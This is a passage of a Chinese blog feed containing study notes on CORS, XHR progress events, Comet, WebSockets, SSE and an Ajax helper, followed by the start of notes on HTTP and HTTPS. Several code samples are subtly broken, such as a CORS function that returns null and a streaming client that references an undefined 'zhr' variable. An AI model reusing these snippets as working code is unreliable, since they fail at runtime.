class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createCORSRequest</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"withCredentials"</span> <span class="token keyword">in</span> xhr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> XDomainRequest <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XDomainRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    xhr <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>Preflighted Request<ul><li>CORS通过一种Preflighted Request的透明服务器验证机制支持开发人员使用自定义的头部、GET或POST之外的方法，以及不同类型的主体内容。在使用以下高级选项来发送请求时，就会向服务器发送一个Preflight请求。这种请求使用OPTIONS方法，发送下列头部：<ul><li><code>Origin</code>：与简单请求相同</li><li><code>Access-Control-Request-Method</code>：请求自身使用的方法</li><li><code>Access-Control-Request-Headers</code>：自定义的头部信息，多个头部以逗号分隔</li></ul></li><li>发送请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：<ul><li><code>Access-Control-Allow-Origin</code>：与简单的请求相同</li><li><code>Access-Control-Allow-Methods</code>：允许的方法，多个方法以逗号分隔</li><li><code>Access-Control-Allow-Headers</code>：允许的头部，多个头部以逗号分隔</li><li><code>Access-Control-Max-Age</code>：应该将这个Preflight请求缓存多长时间（以秒表示）</li></ul></li></ul></li><li>带凭据的请求<ul><li>默认情况下，跨域请求不提供凭据（cookie, HTTP认证及客户端SSL证明等）。通过将withCredentials属性设置为true，可以指定某个请求应该发送凭据。如果服务器接受带凭据的请求，会用下面的HTTP头部来响应：<code>Access-Control-Allow-Credentials: true</code></li></ul></li></ul><h4 id="进度事件"><a href="#进度事件" class="headerlink" title="进度事件"></a>进度事件</h4><ul><li>事件<ul><li><code>loadstart</code>：在接收到响应数据的第一个字节时触发</li><li><code>progress</code>：在接收响应期间持续不断地触发</li><li><code>error</code>：在请求发生错误时触发</li><li><code>abort</code>：在因为调用abort()方法而终止链接时触发</li><li><code>load</code>：在接收到完整的响应数据时触发</li><li><code>loadend</code>：在通信完成或者触发error,abort或load事件后触发</li></ul></li><li>progress事件<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token function">createXHR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token operator">||</span> xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">304</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Request was unsuccessfull: "</span> <span class="token operator">+</span> xhr<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span>onprogress <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> divStatus <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"status"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>lengthComputable<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>loaded<span class="token punctuation">)</span><span class="token punctuation">;</span>    divStatus<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Received "</span> <span class="token operator">+</span> event<span class="token punctuation">.</span>loaded <span class="token operator">+</span> <span class="token string">" of "</span> <span class="token operator">+</span> event<span class="token punctuation">.</span>total <span class="token operator">+</span> <span class="token string">" bytes"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> <span class="token string">"t_baike_info.json"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="Comet-服务器推送"><a href="#Comet-服务器推送" class="headerlink" title="Comet (服务器推送)"></a>Comet (服务器推送)</h4><ul><li>Comet能够让信息近乎实时地被推送到页面上，非常适合体育比赛的分数和股票报价</li><li>两种实现的方式：长轮询和流</li><li>长轮询：页面发起一个到服务器的请求，然后服务器一直保持连接打开，直到有数据可发送。发送完数据之后，浏览器关闭连接，随即又发起一个到服务器的新请求。这一过程在页面打开期间一直持续不断。</li><li>用XHR对象实现HTTP流的典型代码：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createStreamingClient</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> progress<span class="token punctuation">,</span> finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token function">createXHR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  recevied <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> result<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      result <span class="token operator">=</span> xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>recevied<span class="token punctuation">)</span><span class="token punctuation">;</span>      recevied <span class="token operator">+</span><span class="token operator">=</span> result<span class="token punctuation">.</span>length<span class="token punctuation">;</span>      <span class="token function">progress</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>zhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token function">finished</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> xhr<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="Web-Sockets"><a href="#Web-Sockets" class="headerlink" title="Web Sockets"></a>Web Sockets</h4><ul><li>Web Sockets的目标是在一个单独的持久连接上提供全双工、<strong>双向通信</strong>。在JavaScript中创建了Web Sockets之后，会有一个HTTP请求发送到浏览器以发起连接。在取得服务器响应后，建立的连接会使用HTTP升级从HTTP协议交换为Web Sockets协议</li><li>创建<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">"ws://www.example.com/server.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>关闭<pre class=" language-javascript"><code class="language-javascript">socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>发送和接收数据<pre class=" language-javascript"><code class="language-javascript">socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> data <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="SSE服务器发送事件"><a href="#SSE服务器发送事件" class="headerlink" title="SSE服务器发送事件"></a>SSE服务器发送事件</h4><ul><li>SSE API用于创建到服务器的单向连接，服务器通过这个连接可以发送任意数量的数据。服务器响应的MIME类型必须是<code>text/event-stream</code>，而且是浏览器中的JavaScript API能够解析格式输出。SSE支持短轮询、长轮询和HTTP流，而且能够在断开连接时自动确定何时重新连接<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> source <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventSource</span><span class="token punctuation">(</span><span class="token string">"myevents.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>source<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> data <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span>source<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="Ajax的js实现"><a href="#Ajax的js实现" class="headerlink" title="Ajax的js实现"></a>Ajax的js实现</h4><ul><li>实现效果<pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  url<span class="token punctuation">:</span> string<span class="token punctuation">,</span>  type<span class="token punctuation">:</span> string<span class="token punctuation">,</span>  dataType<span class="token punctuation">:</span> string<span class="token punctuation">,</span>  data<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  success<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">,</span>  error<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li>基本实现  <pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> createXHR <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> XMLHttpRequest <span class="token operator">!=</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> ActiveXObject <span class="token operator">!=</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>activeXString <span class="token operator">!=</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> versions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'MSXML2.XMLHttp.6.0'</span><span class="token punctuation">,</span><span class="token string">'MSXML2.XMLHttp.3.0'</span><span class="token punctuation">,</span><span class="token string">'MSXML2.XMLHttp'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>len<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> versions<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>versions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>activeXString <span class="token operator">=</span> versions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'No XHR object available.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>activeXString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'No XHR object available.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Ajax</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>  options <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>url <span class="token operator">=</span> options<span class="token punctuation">.</span>url <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>type <span class="token operator">=</span> options<span class="token punctuation">.</span>type <span class="token operator">||</span> <span class="token string">'get'</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span><span class="token keyword">async</span> <span class="token operator">=</span> options<span class="token punctuation">.</span><span class="token keyword">async</span> <span class="token operator">||</span> <span class="token boolean">true</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>dataType <span class="token operator">=</span> options<span class="token punctuation">.</span>dataType <span class="token operator">||</span> <span class="token string">'text'</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>data <span class="token operator">=</span> options<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>success <span class="token operator">=</span> options<span class="token punctuation">.</span>success <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>error <span class="token operator">=</span> options<span class="token punctuation">.</span>error <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>contentType <span class="token operator">=</span> options<span class="token punctuation">.</span>contentType <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token string">'Content-type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token function">createXHR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 事件处理</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token operator">||</span> xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">304</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      options<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      options<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>xhr<span class="token punctuation">,</span> xhr<span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//启动请求</span><span class="token keyword">if</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>type<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token function">formatParam</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> url <span class="token operator">=</span> options<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> params<span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> options<span class="token punctuation">.</span><span class="token keyword">async</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>type<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token function">formatParam</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> options<span class="token punctuation">.</span>url<span class="token punctuation">,</span> options<span class="token punctuation">.</span><span class="token keyword">async</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> options<span class="token punctuation">.</span>contentType<span class="token punctuation">)</span> <span class="token punctuation">{</span>    xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> options<span class="token punctuation">.</span>contentType<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">formatParam</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> data <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ajax </tag>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解</title>
      <link href="/2018/08/22/http-xiang-jie/"/>
      <url>/2018/08/22/http-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li>[图灵程序设计丛书].HTTP／2基础教程</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener">HTTP</a></li></ul><h4 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h4><p>标识符</p><ul><li>URI: 统一资源标识符</li><li>URL: 统一资源定位符</li><li>URN: 通过特定命名空间中的唯一名称来标识资源  </li></ul><p>URI语法</p><ul><li>方案/协议 Protocol（data/file/ftp/http/https/mailto/ssh/tel/urn/view-source/ws/wss）</li><li>主机 Domain Name</li><li>端口 Port</li><li>路径 Path</li><li>查询 Parameters</li><li>片段 Anchor</li></ul><p>MIME类型</p><ul><li>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理文档；因此服务器设置正确以将正确的MIME类型附加到响应对象的头部是非常重要的。</li><li>语法：<code>type/subtype</code></li><li>例子<br><img src="/img/in-post/http-01.JPG" alt=""><br><img src="/img/in-post/http-02.JPG" alt=""><ul><li>css: <code>text/css</code></li><li>html: <code>text/html</code></li><li>js: <code>application/javascript</code> or <code>application/ecmascript</code></li><li>form-data: <code>multipart/form-data</code></li></ul></li><li><code>X-Content-Type-Options</code><ul><li>语法：<code>X-Content-Type-Options: nosniff</code></li><li>作用：阻止一个MIME类型不匹配的请求，比如”style”的MIME类型不是”text/css”</li></ul></li></ul><h4 id="HTTP基础"><a href="#HTTP基础" class="headerlink" title="HTTP基础"></a>HTTP基础</h4><ul><li><p><strong>HTTP</strong></p><ol><li>概况：Web应用层协议是超文本传输协议。HTTP使用TCP作为它的支撑传输协议，HTTP客户首先发起一个与服务器TCP连接，一旦连接建立，该浏览器和服务器进程就可以通过套接字访问TCP。<strong>HTTP是一个无状态协议</strong>，因为HTTP服务器并不保存客户的任何信息。</li><li>HTTP报文结构: 请求行/响应行 + 首部行 + 空行 + 实体体<br><img src="/img/in-post/http-01.png" alt=""><br><img src="/img/in-post/http-02.png" alt=""></li></ol></li><li><p><strong>HTTPS</strong></p><ol><li>HTTPS的全称是Hyper Text Transfer Protocol over Secure Socket Layer是以安全为目标的HTTP通道，即在HTTP下加入SSL层。</li><li>HTTPS的安全基础是SSL，因此通过它传输的内容都是经过SSL加密的，它的主要作用可以分为两种：<ul><li>建立一个信息安全通道来保证数据传输的安全</li><li>确认网站的真实性，凡是使用了HTTPS的网站，都可以通过点击浏览器地址的锁头标志查看网站认证的真实信息。</li></ul></li></ol></li><li><p><strong>DNS域名系统</strong></p><ol><li>DNS协议运行在UDP之上，使用53端口，将用户提供的域名解析为IP地址。</li><li>请求过程：浏览器从请求URL中抽取出主机名，并将这台主机名传送给DNS应用的客户端；DNS客户端向服务器发送一个包含主机名的请求；DNS客户最终会收到一份回答报文，包含对应与该主机名的IP地址；一旦浏览器接受到来自DNS的该IP地址，就能向位于该IP地址的80端口的HTTP服务进程发起一个TCP连接。</li></ol></li><li><p><strong>HTTP/2</strong></p><ol><li>HTTP/2是二进制协议而不是文本协议</li><li>复用协议：并行请求能在同一个链接中处理</li><li>压缩了headers</li><li>允许服务器在客户端缓存中填充数据</li></ol></li></ul><h4 id="HTTP消息"><a href="#HTTP消息" class="headerlink" title="HTTP消息"></a>HTTP消息</h4><p><img src="/img/in-post/http-03.png" alt="HTTP Message"></p><ul><li>HTTP请求：HTTP请求是由客户端发出的消息，用来使服务器执行动作。<ol><li>起始行包含三个元素：<ul><li>一个HTTP方法：GET/POST/PUT/HEAD/OPTIONS</li><li>请求目标，通常是一个URL</li><li>HTTP版本</li></ul></li><li>头部</li><li>Body</li></ol></li><li>HTTP响应<ol><li>状态行<ul><li>协议版本</li><li>状态码</li><li>状态文本</li></ul></li><li>头部</li><li>Body</li></ol></li><li>HTTP/1.x性能上的缺点：头部不像实体部分可以压缩，在两个报文之间的头部非常相似，在连接中重复传输，无法复用。</li><li>HTTP/2将HTTP/1.x消息分成帧并潜入到流中。数据帧和报头帧分离，允许报头压缩。将多个流组合，这是一个称为多路复用的过程，允许更加有效的底层TCP连接。HTTP/2 帧机制是在 HTTP/1.x 语法和底层传输协议之间增加了一个新的中间层，而没有从根本上修改它，即它是建立在经过验证的机制之上。</li></ul><h4 id="HTTP会话"><a href="#HTTP会话" class="headerlink" title="HTTP会话"></a>HTTP会话</h4><p>通常会话包含三个阶段：① 客户端建立一条TCP连接；② 客户端发送请求并等待应答；③ 服务器处理请求并送回应答，包括一个状态码和对应的数据；HTTP/1.1开始，连接在完成第三阶段后不再关闭，客户端可以再次发起新的请求，即②③步可以连续进行数次</p><h4 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" 